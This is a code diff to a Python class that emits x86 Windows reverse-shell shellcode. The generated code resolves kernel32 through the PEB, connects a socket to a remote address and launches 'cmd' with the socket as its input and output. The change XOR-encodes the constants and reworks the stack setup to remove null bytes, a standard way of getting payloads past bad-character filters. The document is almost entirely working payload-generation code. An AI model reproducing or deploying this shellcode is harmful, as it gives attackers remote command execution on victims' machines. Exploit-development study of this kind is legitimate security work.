@@ -92,8 +92,6 @@ class Shellcode():
 
         stub = f"""
 getKernel32:
-    push ebp
-    mov ebp, esp
     mov dl, 0x4b
 getPEB:
     xor ebx, ebx
@@ -111,8 +109,6 @@ search:
     cmp [esi], dl
     jne search
 found:
-    leave
-    ret
         """
 
         return stub
@@ -255,8 +251,23 @@ get_{imports[func]}:
 _start:
     push ebp
     mov ebp, esp
-    sub esp, {self.stack_space}
-    call getKernel32
+
+    ; Allocate the stack space with the use of AL of EAX in order to avoid a NULL byte
+    xor eax, eax
+    mov al, {self.stack_space}
+    sub esp, eax
+"""
+
+        shellcode += self.get_kernel32()
+
+        shellcode += """
+    jmp resolveFunctions
+"""
+
+        shellcode += self.lookup_function()
+
+        shellcode += """
+resolveFunctions:
     mov edi, eax
 """
 
@@ -298,7 +309,21 @@ call_WSASocketA:
     call eax
 
     mov esi, eax ; Save the socket file descriptor (sockfd)
+"""
 
+        # Generate a value that will be XOR'd by 0xFFFFFFFF in order to get the
+        # original value for:
+        #
+        #   sin_port | sin_family
+        #   STARTF_USESTDHANDLES
+        #   "cmd"
+        #
+        # These values will then have to be XOR'd by 0xFFFFFFFF
+        xor_sockaddr = hex(int(f"{sin_port}{sin_family}", 16) ^ 0xFFFFFFFF)
+        xor_std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16) ^ 0xFFFFFFFF)
+        xor_cmd = hex(0x646d63 ^ 0xFFFFFFFF)
+
+        shellcode += f"""
 ; EAX => connect([in] SOCKET s,
 ;                [in] const sockaddr *name,
 ;                [in] int namelen);
@@ -307,7 +332,11 @@ call_connect:
     mov cl, {ctypes.sizeof(ws2def.sockaddr)}
     push ecx
     mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {sin_addr}
-    mov dword ptr [ebp - {self.storage_offsets['name']}], 0x{sin_port}{sin_family}
+
+    mov eax, 0xffffffff
+    xor eax, {xor_sockaddr}
+
+    mov dword ptr [ebp - {self.storage_offsets['name']}], eax
     lea ecx, [ebp - {self.storage_offsets['name']}]
     push ecx
     push esi
@@ -328,7 +357,8 @@ memsetStructBuffer:
 initMembers:
     mov al, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
     mov [ebx], eax
-    mov eax, {processthreadsapi.STARTF_USESTDHANDLES}
+    mov eax, 0xffffffff
+    xor eax, {xor_std_handles}
     mov [ebx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
     mov [ebx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], esi
     mov [ebx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], esi
@@ -358,7 +388,9 @@ call_CreateProccessA:
     push ecx
     push ecx
     lea ecx, [ebp - {self.storage_offsets['lpCommandLine']}]
-    mov dword ptr [ecx], 0x646d63
+    mov eax, 0xffffffff
+    xor eax, {xor_cmd}
+    mov dword ptr [ecx], eax
     push ecx
     xor ecx, ecx
     push ecx
@@ -377,9 +409,6 @@ call_TerminateProcess:
     mov eax, [ebp - {self.storage_offsets['TerminateProcess']}]
     call eax
 """
-
-        shellcode += self.get_kernel32()
-        shellcode += self.lookup_function()
 
         return shellcode
 
